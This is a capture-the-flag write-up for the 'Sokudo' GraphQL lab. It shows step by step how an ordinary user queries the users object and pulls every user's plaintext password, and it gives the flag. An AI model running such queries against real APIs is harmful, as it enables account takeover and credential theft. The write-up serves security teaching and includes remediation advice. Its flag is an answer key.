# Sokudo — sokudo-005 — GraphQL

## Challenge Information

* **Challenge:** Sokudo
* **Category:** Web Security
* **Hint:** GraphQL
* **Vulnerability:** Broken Access Control / Excessive Data Exposure
* **Target:** Bugforge Lab

---

## 1. Application Reconnaissance

After registering a normal test account, navigate to the **Practice** page and start a typing session.

While completing the session, intercept the requests using **Burp Suite** or the browser's Network tab.

The application makes requests to:

```text
POST /api/graphql
```

The request contains a GraphQL mutation similar to:

```graphql
mutation LogActivity($event: String!, $userId: ID, $metadata: String) {
  logActivity(event: $event, userId: $userId, metadata: $metadata) {
    id
    event
    timestamp
  }
}
```

This confirms that the application uses GraphQL for its backend API.

---

## 2. Test GraphQL Queries

Since the API accepts arbitrary GraphQL queries, test whether the schema exposes other objects.

Send the following request to `/api/graphql`:

```json
{
  "query": "{users{ id}}"
}
```

The server responds with:

```json
{
  "data": {
    "users": [
      {"id": "1"},
      {"id": "2"},
      {"id": "3"},
      {"id": "4"}
    ]
  }
}
```

This indicates that the authenticated user can query the `users` object.

---

## 3. Test for Sensitive Fields

Next, request a potentially sensitive field from the `users` object:

```graphql
{
  users {
    password
  }
}
```

Send it as:

```json
{
  "query": "{users{ password}}"
}
```

The server returns:

```json
{
  "data": {
    "users": [
      {
        "password": "bug{TS0wYUFnXnBbszi5tZpufIGSCwqAi9R1}"
      },
      {
        "password": "password123"
      },
      {
        "password": "learner456"
      },
      {
        "password": "qwerty"
      }
    ]
  }
}
```

The first returned password is the challenge flag.

---

## 4. Flag

```text
bug{TS0wYUFnXnBbszi5tZpufIGSCwqAi9R1}
```

---

## 5. Vulnerability Analysis

The application has insufficient authorization controls on its GraphQL API.

A normal authenticated user is able to query:

```graphql
{
  users {
    password
  }
}
```

and retrieve sensitive information belonging to other users.

The API should verify that the requesting user is authorized to access the requested data before resolving the `users` object and especially sensitive fields such as `password`.

### Vulnerability Type

* Broken Access Control
* Excessive Data Exposure
* Sensitive Information Disclosure
* GraphQL Authorization Misconfiguration

### Impact

An attacker with a normal account can retrieve sensitive information belonging to other users.

In a real-world application, exposing plaintext passwords could result in:

* Account takeover
* Credential reuse attacks
* Unauthorized access to other services
* Exposure of sensitive user information

---

## 6. Proof of Concept

Authenticated request:

```http
POST /api/graphql
Content-Type: application/json
Authorization: Bearer <authenticated-user-token>
```

GraphQL query:

```graphql
{
  users {
    password
  }
}
```

The server returns password data for multiple users without requiring administrative privileges.

---

## 7. Conclusion

The **Sokudo** challenge can be solved by identifying the GraphQL endpoint and testing whether unauthorized fields can be queried.

The key discovery was that the `users` GraphQL object was accessible to a regular authenticated user, and the `password` field was exposed without proper authorization.

The exposed value contained the challenge flag.